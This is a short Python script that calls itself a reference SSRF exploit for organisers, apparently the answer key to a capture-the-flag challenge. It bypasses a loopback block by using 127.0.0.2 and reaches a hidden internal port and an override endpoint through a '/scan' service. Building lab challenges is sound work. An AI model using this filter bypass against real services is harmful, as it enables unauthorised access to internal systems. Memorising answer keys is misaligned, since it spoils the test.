#!/usr/bin/env python3
"""Reference SSRF exploit for organizers."""
import requests, sys
BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:5003"
def scan(u): return requests.post(BASE+"/scan", json={"url": u}).json()["log"]
# 127.0.0.1 is blocked -> bypass with 127.0.0.2 (still loopback). Port 9000 from the HTML comment.
print("HOP 1:\n", scan("http://127.0.0.2:9000/"))
print("\nHOP 2:\n", scan("http://127.0.0.2:9000/incursion-override"))
